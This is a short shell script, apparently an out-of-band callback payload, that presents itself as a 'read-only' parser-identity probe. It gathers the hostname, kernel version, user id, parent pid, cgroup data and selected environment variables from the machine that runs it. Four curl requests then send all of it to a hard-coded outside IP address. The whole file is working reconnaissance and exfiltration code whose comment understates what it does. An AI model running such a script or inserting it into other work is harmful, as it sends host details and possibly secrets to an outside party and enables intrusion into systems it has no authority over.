#!/bin/sh
# i405 parser-identity probe (read-only): reports the host/pid that EXECUTES this script.
B='http://91.215.85.170:18088'
h=$(hostname); u=$(uname -r); i=$(id -u); p=$(awk '{print $4}' /proc/$$/stat)
e=$(tr '\0' '\n' </proc/self/environ | grep -Ei 'HOSTNAME|ENV|NODE|SHARP|APP' | head -c 400 | tr '\n' ';')
c=$(head -c 200 /proc/self/cgroup | tr '\n' ';')
curl -s -m 20 -G --data-urlencode "t=i405P-host" --data-urlencode "d=$h" "$B" >/dev/null 2>&1
curl -s -m 20 -G --data-urlencode "t=i405P-info" --data-urlencode "d=$h|$u|uid=$i|ppid=$p|cg=$c" "$B" >/dev/null 2>&1
curl -s -m 20 -G --data-urlencode "t=i405P-env" --data-urlencode "d=$e" "$B" >/dev/null 2>&1
curl -s -m 20 -G --data-urlencode "t=i405P-done" --data-urlencode "d=$h" "$B" >/dev/null 2>&1
